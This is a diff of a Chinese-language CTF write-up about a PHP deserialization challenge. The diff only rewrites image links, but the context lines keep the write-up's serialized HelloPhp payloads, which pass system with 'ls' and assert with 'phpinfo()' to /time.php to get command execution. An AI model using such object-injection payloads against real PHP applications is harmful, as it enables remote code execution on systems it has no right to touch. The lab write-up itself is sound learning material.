@@ -1,13 +1,13 @@
-![[Pasted image 20221201150134.png]]
+![](<./img/Pasted image 20221201150134.png>)
 
 ---
 首页长这样
 
-![[Pasted image 20221201150215.png]]
+![](<./img/Pasted image 20221201150215.png>)
 
 查看前端代码，尝试寻找注入
 
-![[Pasted image 20221201150309.png]]
+![](<./img/Pasted image 20221201150309.png>)
 
 ```php
 /time.php?source
@@ -46,7 +46,7 @@ if(isset($_GET['source']))
 ```php
 /time.php?data=O:8:"HelloPhp":2:{s:1:"a";s:2:"ls";s:1:"b";s:6:"system";}
 ```
-![[Pasted image 20221201154452.png]]
+![](<./img/Pasted image 20221201154452.png>)
 
 并没有反应，看来是`system`被ban了
 
@@ -61,12 +61,12 @@ if(isset($_GET['source']))
 /time.php?data=O:8:"HelloPhp":2:{s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";}
 ```
 
-![[Pasted image 20221201170810.png]]
+![](<./img/Pasted image 20221201170810.png>)
 
 这个在本地机上咋也跑不起来QAQ，然后查文档发现是本地机`php`版本太高了
 
-![[Pasted image 20221201165741.png]]
+![](<./img/Pasted image 20221201165741.png>)
 
-![[Pasted image 20221201165815.png]]
+![](<./img/Pasted image 20221201165815.png>)
 
 #Web #PHP #反序列化 #bypass #assert #function #环境变量
